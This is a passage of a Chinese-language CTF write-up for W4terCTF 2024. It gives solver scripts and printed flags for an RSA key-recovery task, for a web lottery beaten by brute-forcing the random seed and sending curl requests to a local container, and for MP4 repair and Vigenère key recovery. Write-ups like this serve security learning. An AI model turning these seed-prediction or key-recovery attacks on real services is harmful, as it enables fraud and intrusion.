x^2p+y^2q=h_5\\
pq=n
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>得到</p>
<p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><msup><mi>q</mi><mn>2</mn></msup><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub><mi>q</mi><mo>+</mo><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y^2q^2-h_5q+nx^2=0
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></span></p>
<p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>q</mi><mo>=</mo><mfrac><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>±</mo><msqrt><mrow><msubsup><mi>h</mi><mn>5</mn><mn>2</mn></msubsup><mo>−</mo><mn>4</mn><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>2</mn></msup></mrow></msqrt></mrow><mrow><mn>2</mn><msup><mi>y</mi><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">q=\frac{h_5\pm\sqrt{h_5^2-4nx^2y^2}}{2y^2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.5104em;vertical-align:-0.8804em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.63em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.6802em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">±</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9498em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">4</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9098em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119
c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
c340,-704.7,510.7,-1060.3,512,-1067
l0 -0
c4.7,-7.3,11,-11,19,-11
H40000v40H1012.3
s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
M1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2902em;"><span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>得到的q有两个解,仅保留整数解,然后根据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mfrac><mi>n</mi><mi>q</mi></mfrac></mrow><annotation encoding="application/x-tex">p=\frac nq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1765em;vertical-align:-0.4811em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4811em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>得到p</p>
<p>现在得到了pq, 只需要e就能求得私钥d</p>
<p>因为题目没有直接提供e, 所以这里需要亿点点枚举</p>
<p>已知e是一个36位的素数, 枚举时使用<code>getPrime()</code>获得</p>
<p>它需要满足以下条件</p>
<ul>
<li><code>GCD(e, (p - 1) * (q - 1)) == 1 and e &lt; (p-1)*(q-1) </code></li>
<li><code>( reduce(lambda x, y: x * y, range(1, h1 - 1)) * e) % h1 == h2</code>(用到hint1和hint2)</li>
<li><code>h4 == d % (2 ** (d.bit_length() // 4))</code> (用到hint4)</li>
</ul>
<p>最终代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt<br><span class="hljs-keyword">import</span> os<br>h5 = <span class="hljs-number">15237245518187783270118095809520813715956779970121151605236017245281663349927871664089323996437198235332380649056157552139824794588282124241562678460596507994160450297450179528976589398846210519549196888613143426635079434084452257874065484561750625879566967728892028875015732523907566365015585071705383965108584900462347980930243703796275135520452238877712806925535901382203444872746731017403372197551202867519872504341875747056250334169640471053205861370866906946583776837242814046091601932206546117069281206618021968118790407685235602371416190212336628756323090425345962230904747291854448754116455587682431569485503641521272971686704473193019132477953908910849831685148677975221237038065750758015111863632278200747000157187997814194029400697403741838489362003974564359614821068833924840443285823258682774010695163217945524608036622625872746384332883461936945674717452827633809865102717159507550663596896932548991216607522697367537118903992798078936423232478772212951734438159292917127451068031982531631571612297893227345579357245226069692084913823443945826318169121459999393340568902299486793470467510065851569244119435052446898779718050907739373838489841346799589855583093882137549631777101404814967710333142369685932771643559927586884873934944456529776507128155937030841026343151440450761869269196359152094226878375985237603824966654988556567217028134068892779253422300240576637315948429841799367844063885304545920357705733411373493758050263143074535948457</span><br>x = <span class="hljs-number">34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801</span><br>y = <span class="hljs-number">109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160</span><br>n = <span class="hljs-number">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span><br><br><br>delta2 = h5**<span class="hljs-number">2</span>-<span class="hljs-number">4</span>*n*x**<span class="hljs-number">2</span>*y**<span class="hljs-number">2</span><br>delta = gmpy2.iroot(delta2,<span class="hljs-number">2</span>)<br>delta = <span class="hljs-built_in">int</span>(delta[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(delta)<br><span class="hljs-keyword">if</span> (h5+delta)%(<span class="hljs-number">2</span>*y**<span class="hljs-number">2</span>) == <span class="hljs-number">0</span>:<br>    <br>    q1=(h5+delta)//(<span class="hljs-number">2</span>*y**<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q1 = <span class="hljs-subst">&#123;q1&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">if</span> (h5-delta)%(<span class="hljs-number">2</span>*y**<span class="hljs-number">2</span>) == <span class="hljs-number">0</span>:<br>    <br>    q2=(h5-delta)//(<span class="hljs-number">2</span>*y**<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q2=<span class="hljs-subst">&#123;q2&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> n%q2 == <span class="hljs-number">0</span>:<br>    p=n//q2<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>    <br>q=q2<br><span class="hljs-comment"># 求e</span><br>h1 = <span class="hljs-number">150247</span><br>h2 = <span class="hljs-number">102488</span><br>h4 = <span class="hljs-number">44535490898726654427376304836986323627856798106830892558987452614726931403119</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q=<span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br>tmp = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, h1 - <span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    e = getPrime(<span class="hljs-number">36</span>)<br>    <span class="hljs-keyword">if</span> GCD(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> e &lt; (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> ( tmp * e) % h1 == h2:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;maybe e=<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        d=gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;maybe d=<span class="hljs-subst">&#123;d&#125;</span>&quot;</span>)<br>        nh4 = d % (<span class="hljs-number">2</span> ** (d.bit_length() // <span class="hljs-number">4</span>))<br>        <span class="hljs-keyword">if</span> nh4 == h4:<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e=<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;d=<span class="hljs-subst">&#123;d&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>开 8 个线程运行一晚上, 成功枚举到正确的e, 并得到d</p>
<p>使用下面的脚本, 根据私钥解密密文, 得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>e = <span class="hljs-number">36905723839</span><br>d = <span class="hljs-number">66781150190539205038154636873316650284846375610597564467113301562207220876080997654261761651771185773920764536611596660709696442562219146865775186656742157829910073552979854383590613522355255045862718785890708775548436159002198598103886840865569957379996409759081212055357149668774721007823047658341778542959</span><br>n = <span class="hljs-number">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span><br>c = <span class="hljs-number">33087238461387318335074410411142790336660168200231648518849044049333308060938917518277424800358623613184976785426565004507278568420843160272353164463818453523209164535111619601021121321114970839731250362111118957833038271450092546392532900928613625992384890463665974527179679504545602403023570778993190377708</span><br><br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>
<p><code>W4terCTF&#123;W47cH_oUT_7He_Smok3_hIn75_1ROM_wll5oN&#125;</code></p>
<h3 id="Wish">Wish</h3>
<p>查看源代码，看到确定抽取结果的逻辑：</p>
<figure class="highlight python"><figcaption><span>app.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_wish</span>(<span class="hljs-params">time, index</span>):<br>    random.seed(time)<br>    probability = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(index):<br>        diff = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">abs</span>(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1919810</span>) - <span class="hljs-number">114514</span>), <span class="hljs-number">10000</span>)<br>        probability = <span class="hljs-number">100</span> * (<span class="hljs-number">0.1</span>) ** diff<br>    app.logger.info(<br>        <span class="hljs-string">f&#x27;probability: <span class="hljs-subst">&#123;probability&#125;</span>, time: <span class="hljs-subst">&#123;time&#125;</span>, index: <span class="hljs-subst">&#123;index&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>.from_bytes(os.urandom(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;little&#x27;</span>) % <span class="hljs-number">100</span> + <span class="hljs-number">1</span> &lt;= probability:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        characters = string.ascii_letters + string.digits<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure>
<p>发现是利用 <code>time</code> 作为伪随机数序列的初始化种子，要想抽出 flag ，需要 <code>probability</code> 尽可能地大，那么 <code>index</code> 只能取 <code>1</code> ，<code>abs(random.randint(0, 1919810) - 114514)</code> 的值只能为 <code>0</code> 或 <code>1</code> ，所以据此爆破出一个可行的 <code>time</code> ：</p>
<figure class="highlight python"><figcaption><span>pwn_time.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">r = <span class="hljs-number">24</span>*<span class="hljs-number">60</span>*<span class="hljs-number">60</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>    random.seed(i)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1919810</span>) - <span class="hljs-number">114514</span>) &lt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>
<p>得到唯一符合目标的结果：<code>time=20544</code> ，然后就是真的抽 flag ：</p>
<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X GET -H &quot;Content-Type:application/octet-stream&quot; http://127.0.0.1:52829/query_reset<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 获取 3 次 wish 机会</span></span><br><br>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;time&quot;:20544,&quot;index&quot;:1&#125;&#x27; http://127.0.0.1:52829/wish<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 抽 flag</span></span><br></code></pre></td></tr></table></figure>
<p><code>W4terCTF&#123;Crack_insteal_of_wish_the_seed_d0ab21251107&#125;</code></p>
<blockquote>
<p>即使这样还抽了十几次才出 flag , 好黑的池子！</p>
</blockquote>
<h2 id="Misc">Misc</h2>
<h3 id="Sign-In">Sign In</h3>
<p>排行榜</p>
<h3 id="broken-mp4">broken.mp4</h3>
<p>按照 record_1.mp4 的指引,找到了文章链接</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/NDASH/article/details/136151418">https://blog.csdn.net/NDASH/article/details/136151418</a></p>
<p>按照文章指引, 去   <a target="_blank" rel="noopener" href="https://github.com/anthwlock/untrunc/releases/tag/latest">https://github.com/anthwlock/untrunc/releases/tag/latest</a>   下载所需的软件, 选择<code>untrunc_x64</code></p>
<p>运行<code>untrunc-gui</code>, reference file 选 <code>record_1.mp4</code> , truncated file 选 <code>record_2.mp4</code></p>
<p><img src="./W4terCTF2024.assets/Pn5XoKV7AfyCdEg.png" srcset="/img/loading.gif" lazyload alt="brokenmp4"></p>
<p>这样就能得到 <code>record_2.mp4</code> 的修复版, 在视频结尾能找到flag</p>
<p><code>W4terCTF&#123;L1fe_is_5h0rT_so_i_Us3_MKV_248DF3C&#125;</code></p>
<h3 id="Shuffle-Puts">Shuffle Puts</h3>
<p>启动容器,从浏览器访问,可以下载一个文件meow</p>
<p>执行下面的命令查看文件中所有字符串</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings .\meow<br></code></pre></td></tr></table></figure>
<p>在输出中可以找到flag</p>
<p><code>W4terCTF&#123;sHUFF1e_5hufF1e_FLA6_MEOWmeOWm30W&#125;</code></p>
<h3 id="Revenge-of-Vigenere">Revenge of Vigenere</h3>
<p>这题的加密是维吉尼亚密码的一个变种</p>
<p>连接容器后，只能获得加密后的密文</p>
<p>解决思路是如果知道原文的一个片段，而且知道完整的密文，可以尝试倒推KEY。</p>
<p>原文中存在W4terCTF是确定的，可以据此倒退KEY</p>
<p>运行下面的代码，根据已知的明文<code>W4terCTF</code>和密文<code>Q4doySZB</code> , 尝试推出密钥的其中连续7位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> remote<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    recv = <span class="hljs-string">&#x27;Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, 